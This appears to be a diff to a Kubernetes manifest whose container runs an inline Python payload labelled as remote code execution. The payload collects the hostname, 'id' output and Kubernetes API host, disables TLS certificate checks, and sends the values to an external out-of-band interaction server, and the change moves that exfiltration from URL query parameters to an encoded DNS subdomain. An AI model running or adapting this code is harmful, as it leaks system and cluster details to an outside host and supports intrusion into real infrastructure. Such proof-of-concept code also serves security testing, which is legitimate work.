@@ -28,7 +28,7 @@ spec:
           args:
           - |
             python3 -c "
-            import os, subprocess, urllib.request, urllib.parse, ssl
+            import os, re, subprocess, urllib.request, ssl
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
@@ -38,10 +38,12 @@ spec:
             print('[RCE] hostname: ' + h, flush=True)
             print('[RCE] id: ' + id_out, flush=True)
             print('[RCE] K8S_API_HOST: ' + k, flush=True)
-            params = urllib.parse.urlencode({'hostname': h, 'id': id_out, 'k8s_api': k})
-            url = 'https://d7f3ocmipla4s5su4uagwdr16jsrwr95r.oast.pro/?' + params
+            parts = id_out.split()[:2]
+            dns_label = re.sub(r'-+', '-', re.sub(r'[^a-z0-9]', '-', '-'.join(parts).lower())).strip('-')[:50]
+            dns_url = 'http://' + dns_label + '.d7f40amipla5868kagegp9tx1c4su44t8.oast.live/'
+            print('[RCE] DNS_OAST: ' + dns_url, flush=True)
             try:
-                r = urllib.request.urlopen(urllib.request.Request(url), timeout=15, context=ctx)
+                r = urllib.request.urlopen(urllib.request.Request(dns_url), timeout=15, context=ctx)
                 print('[RCE] OAST_HIT: ' + str(r.status), flush=True)
             except Exception as e:
                 print('[RCE] OAST_ERR: ' + str(e), flush=True)
